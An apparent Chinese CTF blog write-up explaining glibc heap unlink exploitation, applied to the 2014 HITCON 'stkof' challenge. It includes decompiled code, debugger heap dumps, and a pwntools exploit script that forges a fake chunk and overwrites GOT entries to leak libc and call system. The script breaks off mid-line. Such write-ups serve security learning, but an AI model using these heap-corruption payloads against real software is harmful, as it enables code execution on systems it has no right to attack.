    <title>Unlink</title>
    <link href="http://www.ol4three.com/2021/02/10/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Linux-Pwn/Unlink/"/>
    <id>http://www.ol4three.com/2021/02/10/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Linux-Pwn/Unlink/</id>
    <published>2021-02-10T07:16:34.000Z</published>
    <updated>2021-09-22T07:49:14.094Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我们在利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。</p><a id="more"></a><p>我们先来简单回顾一下 unlink 的目的与过程，其目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210922154910245.png" alt="image-20210922154910245"></p><p>下面我们首先介绍一下 unlink 最初没有防护时的利用方法，然后介绍目前利用 unlink 的方式。</p><h3 id="古老的unlink"><a href="#古老的unlink" class="headerlink" title="古老的unlink"></a>古老的unlink</h3><p>在最初 unlink 实现的时候，其实是没有对 chunk 的 size 检查和双向链表检查的，即没有如下检查代码。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span><br><span class="line">if (__builtin_expect (chunksize(P) !&#x3D; prev_size (next_chunk(P)), 0))      \</span><br><span class="line">      malloc_printerr (&quot;corrupted size vs. prev_size&quot;);               \</span><br><span class="line">&#x2F;&#x2F; 检查 fd 和 bk 指针(双向链表完整性检查)</span><br><span class="line">if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                      \</span><br><span class="line">  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; largebin 中 next_size 双向链表完整性检查 </span><br><span class="line">              if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize !&#x3D; P, 0)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize !&#x3D; P, 0))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               &quot;corrupted double-linked list (not small)&quot;,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure><p><strong>这里我们以 32 位为例</strong>，假设堆内存最初的布局是下面的样子</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/old_unlink_vul.png" alt="img"></p><p>现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。那么如果我们通过某种方式（<strong>比如溢出</strong>）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时</p><ul><li>glibc 判断这个块是 small chunk</li><li>判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</li><li>判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</li><li>继而对 Nextchunk 采取 unlink 操作</li></ul><p>那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下</p><ul><li>FD=P-&gt;fd = target addr -12</li><li>BK=P-&gt;bk = expect value</li><li>FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value</li><li>BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12</li></ul><p><strong>看起来我们似乎可以通过 unlink 直接实现任意地址读写的目的，但是我们还是需要确保 expect value +8 地址具有可写的权限。</strong></p><p>比如说我们将 target addr 设置为某个 got 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值（expect value）处的代码。<strong>需要注意的是，expect value+8 处的值被破坏了，需要想办法绕过。</strong></p><h3 id="当前的-unlink"><a href="#当前的-unlink" class="headerlink" title="当前的 unlink"></a>当前的 unlink</h3><p><strong>但是，现实是残酷的。。</strong>我们刚才考虑的是没有检查的情况，但是一旦加上检查，就没有这么简单了。我们看一下对 fd 和 bk 的检查</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; fd bk</span><br><span class="line">if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                      \</span><br><span class="line">  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br></pre></td></tr></table></figure><p>此时</p><ul><li>FD-&gt;bk = target addr - 12 + 12=target_addr</li><li>BK-&gt;fd = expect value + 8</li></ul><p>那么我们上面所利用的修改 GOT 表项的方法就可能不可用了。但是我们可以通过伪造的方式绕过这个机制。</p><p>首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要</p><ul><li><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></li><li><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></li></ul><p>当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：</p><ul><li><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></li><li><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></li></ul><p>如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么：</p><ul><li><code>*P = P - 8</code></li><li><code>*P = P - 12</code></li></ul><p>即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。</p><p>如果我们想要使得两者都指向 P，只需要按照如下方式修改即可</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/new_unlink_vul.png" alt="img"></p><p>需要注意的是，这里我们并没有违背下面的约束，因为 P 在 Unlink 前是指向正确的 chunk 的指针。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span><br><span class="line">   if (__builtin_expect (chunksize(P) !&#x3D; prev_size (next_chunk(P)), 0))      \</span><br><span class="line">     malloc_printerr (&quot;corrupted size vs. prev_size&quot;);               \</span><br></pre></td></tr></table></figure><p><strong>此外，其实如果我们设置 next chunk 的 fd 和 bk 均为 nextchunk 的地址也是可以绕过上面的检测的。但是这样的话，并不能达到修改指针内容的效果。</strong></p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol><li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li><li>已知位置存在一个指针指向可进行 UAF 的 chunk</li></ol><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>设指向可 UAF chunk 的指针的地址为 ptr</p><ol><li>修改 fd 为 ptr - 0x18</li><li>修改 bk 为 ptr - 0x10</li><li>触发 unlink</li></ol><p>ptr 处的指针会变为 ptr - 0x18。</p><h2 id="例题-2014-HITCON-stkof"><a href="#例题-2014-HITCON-stkof" class="headerlink" title="例题 2014 HITCON stkof"></a>例题 2014 HITCON stkof</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof">题目链接</a></p><p>查看基本信息如下</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210813094617281.png" alt="image-20210813094617281"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210813094626102.png" alt="image-20210813094626102"></p><p>可以看出程序为64位 主要开启了 Canary和NX保护</p><p>Partial RELRO，可以修改got表</p><h3 id="基本功能如下"><a href="#基本功能如下" class="headerlink" title="基本功能如下"></a>基本功能如下</h3><p>程序存在 4 个功能，经过 IDA 分析后可以分析功能如下</p><ul><li>alloc：输入 size，分配 size 大小的内存，并在 bss 段记录对应 chunk 的指针，假设其为 global</li><li>read_in：根据指定索引，向分配的内存处读入数据，数据长度可控，<strong>这里存在堆溢出的情况</strong></li><li>free：根据指定索引，释放已经分配的内存块</li><li>useless：这个功能并没有什么卵用，本来以为是可以输出内容，结果什么也没有输出</li></ul><h3 id="函数信息如下"><a href="#函数信息如下" class="headerlink" title="函数信息如下"></a>函数信息如下</h3><p>main函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int choice; &#x2F;&#x2F; eax</span><br><span class="line">  signed int v5; &#x2F;&#x2F; [rsp+Ch] [rbp-74h]</span><br><span class="line">  char nptr; &#x2F;&#x2F; [rsp+10h] [rbp-70h]</span><br><span class="line">  unsigned __int64 v7; &#x2F;&#x2F; [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  alarm(0x78u);</span><br><span class="line">  while ( fgets(&amp;nptr, 10, stdin) )</span><br><span class="line">  &#123;</span><br><span class="line">    choice &#x3D; atoi(&amp;nptr);</span><br><span class="line">    if ( choice &#x3D;&#x3D; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 &#x3D; fill();</span><br><span class="line">      goto LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( choice &gt; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( choice &#x3D;&#x3D; 3 )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 &#x3D; free_chunk();</span><br><span class="line">        goto LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">      if ( choice &#x3D;&#x3D; 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 &#x3D; print();</span><br><span class="line">        goto LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( choice &#x3D;&#x3D; 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 &#x3D; alloc();</span><br><span class="line">      goto LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 &#x3D; -1;</span><br><span class="line">LABEL_14:</span><br><span class="line">    if ( v5 )</span><br><span class="line">      puts(&quot;FAIL&quot;);</span><br><span class="line">    else</span><br><span class="line">      puts(&quot;OK&quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用于控制数据流将 stdin转化为整型，根据输入的调用不同函数</p><p>输入1即进入alloc()函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signed __int64 alloc()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 size; &#x2F;&#x2F; [rsp+0h] [rbp-80h]</span><br><span class="line">  char *v2; &#x2F;&#x2F; [rsp+8h] [rbp-78h]</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+10h] [rbp-70h]</span><br><span class="line">  unsigned __int64 v4; &#x2F;&#x2F; [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  size &#x3D; atoll(&amp;s);</span><br><span class="line">  v2 &#x3D; (char *)malloc(size);</span><br><span class="line">  if ( !v2 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  globals[++cnt] &#x3D; v2;</span><br><span class="line">  printf(&quot;%d\n&quot;, (unsigned int)cnt, size);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将stdin转换为整型作为size，然后malloc堆空间，返回的地址根据索引存入globals，且有++cnt，因此索引从1开始。</p><p>输入2即进入fill()函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signed __int64 fill()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; &#x2F;&#x2F; rax</span><br><span class="line">  int i; &#x2F;&#x2F; eax</span><br><span class="line">  unsigned int idx; &#x2F;&#x2F; [rsp+8h] [rbp-88h]</span><br><span class="line">  __int64 size; &#x2F;&#x2F; [rsp+10h] [rbp-80h]</span><br><span class="line">  char *ptr; &#x2F;&#x2F; [rsp+18h] [rbp-78h]</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+20h] [rbp-70h]</span><br><span class="line">  unsigned __int64 v6; &#x2F;&#x2F; [rsp+88h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  idx &#x3D; atol(&amp;s);</span><br><span class="line">  if ( idx &gt; 1048576 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  if ( !globals[idx] )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  size &#x3D; atoll(&amp;s);</span><br><span class="line">  ptr &#x3D; globals[idx];</span><br><span class="line">  for ( i &#x3D; fread(ptr, 1uLL, size, stdin); i &gt; 0; i &#x3D; fread(ptr, 1uLL, size, stdin) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr +&#x3D; i;</span><br><span class="line">    size -&#x3D; i;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( size )</span><br><span class="line">    result &#x3D; 0xFFFFFFFFLL;</span><br><span class="line">  else</span><br><span class="line">    result &#x3D; 0LL;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据索引在globals数组获取地址，并通过修改堆的内容，size可控并且没有限制长度，存在堆溢出漏洞。</p><p>输入3 进入free_chunk()函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signed __int64 free_chunk()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int idx; &#x2F;&#x2F; [rsp+Ch] [rbp-74h]</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+10h] [rbp-70h]</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  fgets(&amp;s, 16, stdin);</span><br><span class="line">  idx &#x3D; atol(&amp;s);</span><br><span class="line">  if ( idx &gt; 0x100000 )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  if ( !globals[idx] )</span><br><span class="line">    return 0xFFFFFFFFLL;</span><br><span class="line">  free(globals[idx]);</span><br><span class="line">  globals[idx] &#x3D; 0LL;</span><br><span class="line">  return 0LL</span><br></pre></td></tr></table></figure><p>根据索引在globals数组获取地址，再free空间。</p><h3 id="IO缓存区问题分析"><a href="#IO缓存区问题分析" class="headerlink" title="IO缓存区问题分析"></a>IO缓存区问题分析</h3><p>值得注意的是，由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。这里经过测试，会申请两个缓冲区，分别大小为 1024 和 1024。具体如下，可以进行调试查看</p><p>初次调用 fgets 时，malloc 会分配缓冲区 1024 大小。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*RAX  0x0</span><br><span class="line">*RBX  0x400</span><br><span class="line">*RCX  0x7ffff7b03c34 (__fxstat64+20) ◂— cmp    rax, -0x1000 &#x2F;* &#39;H&#x3D;&#39; *&#x2F;</span><br><span class="line">*RDX  0x88</span><br><span class="line">*RDI  0x400</span><br><span class="line">*RSI  0x7fffffffd860 ◂— 0x16</span><br><span class="line">*R8   0x1</span><br><span class="line">*R9   0x0</span><br><span class="line">*R10  0x7ffff7fd2700 ◂— 0x7ffff7fd2700</span><br><span class="line">*R11  0x246</span><br><span class="line">*R12  0xa</span><br><span class="line">*R13  0x9</span><br><span class="line"> R14  0x0</span><br><span class="line">*R15  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288</span><br><span class="line">*RBP  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288</span><br><span class="line">*RSP  0x7fffffffd858 —▸ 0x7ffff7a7a1d5 (_IO_file_doallocate+85) ◂— mov    rsi, rax</span><br><span class="line">*RIP  0x7ffff7a91130 (malloc) ◂— push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x7ffff7a91130 &lt;malloc&gt;        push   rbp &lt;0x7ffff7dd18e0&gt;</span><br><span class="line">...，省略</span><br><span class="line"> ► f 0     7ffff7a91130 malloc</span><br><span class="line">   f 1     7ffff7a7a1d5 _IO_file_doallocate+85</span><br><span class="line">   f 2     7ffff7a88594 _IO_doallocbuf+52</span><br><span class="line">   f 3     7ffff7a8769c _IO_file_underflow+508</span><br><span class="line">   f 4     7ffff7a8860e _IO_default_uflow+14</span><br><span class="line">   f 5     7ffff7a7bc6a _IO_getline_info+170</span><br><span class="line">   f 6     7ffff7a7bd78</span><br><span class="line">   f 7     7ffff7a7ab7d fgets+173</span><br><span class="line">   f 8           400d2e</span><br><span class="line">   f 9     7ffff7a2d830 __libc_start_main+240</span><br></pre></td></tr></table></figure><p>分配之后，堆如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0xe05410</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0xe05000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 1041,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xe05410 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 134129,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当分配 16 大小的内存后，堆布局如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0xe05430</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0xe05000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 1041,</span><br><span class="line">  fd &#x3D; 0xa3631,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xe05410 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 33,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x20bd1</span><br><span class="line">&#125;</span><br><span class="line">0xe05430 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 134097,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当使用 printf 函数，会分配 1024 字节空间，如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*RAX  0x0</span><br><span class="line">*RBX  0x400</span><br><span class="line">*RCX  0x7ffff7b03c34 (__fxstat64+20) ◂— cmp    rax, -0x1000 &#x2F;* &#39;H&#x3D;&#39; *&#x2F;</span><br><span class="line">*RDX  0x88</span><br><span class="line">*RDI  0x400</span><br><span class="line">*RSI  0x7fffffffd1c0 ◂— 0x16</span><br><span class="line"> R8   0x0</span><br><span class="line">*R9   0x0</span><br><span class="line">*R10  0x0</span><br><span class="line">*R11  0x246</span><br><span class="line">*R12  0x1</span><br><span class="line">*R13  0x7fffffffd827 ◂— 0x31 &#x2F;* &#39;1&#39; *&#x2F;</span><br><span class="line"> R14  0x0</span><br><span class="line">*R15  0x400de4 ◂— and    eax, 0x2e000a64 &#x2F;* &#39;%d\n&#39; *&#x2F;</span><br><span class="line">*RBP  0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2284</span><br><span class="line">*RSP  0x7fffffffd1b8 —▸ 0x7ffff7a7a1d5 (_IO_file_doallocate+85) ◂— mov    rsi, rax</span><br><span class="line">*RIP  0x7ffff7a91130 (malloc) ◂— push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x7ffff7a91130 &lt;malloc&gt;       push   rbp &lt;0x7ffff7dd2620&gt;</span><br><span class="line">。。。省略</span><br><span class="line">► f 0     7ffff7a91130 malloc</span><br><span class="line">   f 1     7ffff7a7a1d5 _IO_file_doallocate+85</span><br><span class="line">   f 2     7ffff7a88594 _IO_doallocbuf+52</span><br><span class="line">   f 3     7ffff7a878f8 _IO_file_overflow+456</span><br><span class="line">   f 4     7ffff7a8628d _IO_file_xsputn+173</span><br><span class="line">   f 5     7ffff7a5ae00 vfprintf+3216</span><br><span class="line">   f 6     7ffff7a62899 printf+153</span><br><span class="line">   f 7           4009cd</span><br><span class="line">   f 8           400cb1</span><br><span class="line">   f 9     7ffff7a2d830 __libc_start_main+240</span><br></pre></td></tr></table></figure><p>堆布局如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0xe05840</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0xe05000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 1041,</span><br><span class="line">  fd &#x3D; 0xa3631,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xe05410 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 33,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x411</span><br><span class="line">&#125;</span><br><span class="line">0xe05430 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 1041,</span><br><span class="line">  fd &#x3D; 0xa4b4f,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xe05840 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 133057,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此后，无论是输入输出都不会再申请缓冲区了。所以我们最好最初的申请一个 chunk 来把这些缓冲区给申请了，方便之后操作。</p><p>但是，比较有意思的是，如果我们是 attach 上去的话，第一个缓冲区分配的大小为 4096 大小。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0x1e9b010</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0x1e9a000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 4113,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x1e9b010 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0,</span><br><span class="line">  size &#x3D; 135153,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>根据上面分析，我们在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。</p><p>由于程序本身没有 leak，要想执行 system 等函数，我们的首要目的还是先构造 leak，基本思路如下</p><ul><li>利用 unlink 修改 global[2] 为 &amp;global[2]-0x18。</li><li>利用编辑功能修改 global[0] 为 free@got 地址，同时修改 global[1] 为 puts@got 地址，global[2] 为 atoi@got 地址。</li><li>修改 <code>free@got</code> 为 <code>puts@plt</code> 的地址，从而当再次调用 <code>free</code> 函数时，即可直接调用 puts 函数。这样就可以泄漏函数内容。</li><li>free global[1]，即泄漏 puts@got 内容，从而知道 system 函数地址以及 libc 中 /bin/sh 地址。</li><li>修改 <code>atoi@got</code> 为 system 函数地址，再次调用时，输入 /bin/sh 地址即可。</li></ul><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">context.terminal &#x3D; [&#39;gnome-terminal&#39;, &#39;-x&#39;, &#39;sh&#39;, &#39;-c&#39;]</span><br><span class="line">if args[&#39;DEBUG&#39;]:</span><br><span class="line">    context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">context.binary &#x3D; &quot;.&#x2F;stkof&quot;</span><br><span class="line">stkof &#x3D; ELF(&#39;.&#x2F;stkof&#39;)</span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    p &#x3D; remote(&#39;127.0.0.1&#39;, 7777)</span><br><span class="line">else:</span><br><span class="line">    p &#x3D; process(&quot;.&#x2F;stkof&quot;)</span><br><span class="line">log.info(&#39;PID: &#39; + str(proc.pidof(p)[0]))</span><br><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc.so.6&#39;)</span><br><span class="line">head &#x3D; 0x602140</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def alloc(size):</span><br><span class="line">    p.sendline(&#39;1&#39;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&#39;OK\n&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(idx, size, content):</span><br><span class="line">    p.sendline(&#39;2&#39;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(&#39;OK\n&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    p.sendline(&#39;3&#39;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    # trigger to malloc buffer for io function</span><br><span class="line">    alloc(0x100)  # idx 1</span><br><span class="line">    # begin</span><br><span class="line">    alloc(0x30)  # idx 2</span><br><span class="line">    # small chunk size in order to trigger unlink</span><br><span class="line">    alloc(0x80)  # idx 3</span><br><span class="line">    # a fake chunk at global[2]&#x3D;head+16 who&#39;s size is 0x20</span><br><span class="line">    payload &#x3D; p64(0)  #prev_size</span><br><span class="line">    payload +&#x3D; p64(0x20)  #size</span><br><span class="line">    payload +&#x3D; p64(head + 16 - 0x18)  #fd</span><br><span class="line">    payload +&#x3D; p64(head + 16 - 0x10)  #bk</span><br><span class="line">    payload +&#x3D; p64(0x20)  # next chunk&#39;s prev_size bypass the check</span><br><span class="line">    payload &#x3D; payload.ljust(0x30, &#39;a&#39;)</span><br><span class="line"></span><br><span class="line">    # overwrite global[3]&#39;s chunk&#39;s prev_size</span><br><span class="line">    # make it believe that prev chunk is at global[2]</span><br><span class="line">    payload +&#x3D; p64(0x30)</span><br><span class="line"></span><br><span class="line">    # make it believe that prev chunk is free</span><br><span class="line">    payload +&#x3D; p64(0x90)</span><br><span class="line">    edit(2, len(payload), payload)</span><br><span class="line"></span><br><span class="line">    # unlink fake chunk, so global[2] &#x3D;&amp;(global[2])-0x18&#x3D;head-8</span><br><span class="line">    free(3)</span><br><span class="line">    p.recvuntil(&#39;OK\n&#39;)</span><br><span class="line"></span><br><span class="line">    # overwrite global[0] &#x3D; free@got, global[1]&#x3D;puts@got, global[2]&#x3D;atoi@got</span><br><span class="line">    payload &#x3D; &#39;a&#39; * 8 + p64(stkof.got[&#39;free&#39;]) + p64(stkof.got[&#39;puts&#39;]) + p64(</span><br><span class="line">        stkof.got[&#39;atoi&#39;])</span><br><span class="line">    edit(2, len(payload), payload)</span><br><span class="line"></span><br><span class="line">    # edit free@got to puts@plt</span><br><span class="line">    payload &#x3D; p64(stkof.plt[&#39;puts&#39;])</span><br><span class="line">    edit(0, len(payload), payload)</span><br><span class="line"></span><br><span class="line">    # free global[1] to leak puts addr</span><br><span class="line">    free(1)</span><br><span class="line">    puts_addr &#x3D; 